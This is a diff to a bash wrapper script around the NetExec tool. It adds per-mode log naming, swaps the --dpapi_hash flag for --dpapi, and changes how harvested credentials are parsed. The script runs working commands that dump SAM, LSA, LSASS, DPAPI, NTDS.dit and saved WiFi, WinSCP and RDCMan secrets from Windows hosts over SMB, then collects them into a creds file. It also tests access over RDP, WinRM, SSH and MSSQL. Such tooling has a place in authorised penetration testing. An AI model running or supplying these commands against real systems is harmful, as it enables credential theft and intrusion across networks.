@@ -85,7 +85,11 @@ else
   fi
 fi
 
-LOGFILE="$OUTDIR"/"${TARGET}_${MODE}.log"
+if [[ "$MODE" == "verify" ]]; then
+  LOGFILE="$OUTDIR"/"${USER}_${MODE}.log"
+else
+  LOGFILE="$OUTDIR"/"${TARGET}_${MODE}.log"
+fi
 mkdir -p "$OUTDIR"
 touch "$LOGFILE"
 
@@ -120,7 +124,7 @@ case "$MODE" in
     run_nxc nxc smb "$TARGET" $AUTH_ARGS --sam
     run_nxc nxc smb "$TARGET" $AUTH_ARGS -M lsassy
     run_nxc nxc smb "$TARGET" $AUTH_ARGS --lsa
-    run_nxc nxc smb "$TARGET" $AUTH_ARGS --dpapi_hash
+    run_nxc nxc smb "$TARGET" $AUTH_ARGS --dpapi
     run_nxc nxc smb "$TARGET" $AUTH_ARGS -M wifi
     run_nxc nxc smb "$TARGET" $AUTH_ARGS -M winscp
     run_nxc nxc smb "$TARGET" $AUTH_ARGS -M rdcman
@@ -130,9 +134,9 @@ case "$MODE" in
     script -efqa "$LOGFILE" -c "printf 'Y\n' | nxc smb $TARGET $AUTH_ARGS --ntds"
 
     log "Extracting potential credential lines…"
-    CREDFILE="$OUTDIR"/"$TARGET"_atm.creds
+    CREDFILE="$OUTDIR"/"${TARGET}_${MODE}.creds"
     awk '{for (i=5; i<=NF; i++) printf $i (i<NF ? OFS : ORS)}' $LOGFILE \
-      | rg -a '^\x1b\[1;33m' \
+      | rg -a '^\x1b\[1;33m|^Node' \
       | sed -r 's/\x1b\[[0-9;]*m//g' \
       | sort -u > $CREDFILE
 
@@ -143,11 +147,14 @@ case "$MODE" in
   verify)
     log "Starting service verification…"
     run_nxc nxc smb "$TARGET" $AUTH_ARGS --shares
-    run_nxc nxc ldap "$TARGET" $BASE_AUTH_ARGS
+    # run_nxc nxc ldap "$TARGET" $BASE_AUTH_ARGS
     run_nxc nxc rdp "$TARGET" $BASE_AUTH_ARGS
     run_nxc nxc winrm "$TARGET" $BASE_AUTH_ARGS
     run_nxc nxc ssh "$TARGET" $BASE_AUTH_ARGS
     run_nxc nxc mssql "$TARGET" $BASE_AUTH_ARGS
+
+    sed 's/\r/\n/g' "$LOGFILE" | rg -v Running > "$LOGFILE.tmp" && mv "$LOGFILE.tmp" "$LOGFILE"
+    echo -e "${GREEN}[✓] Logfile output:       ${LOGFILE}"
     ;;
 
   roast)
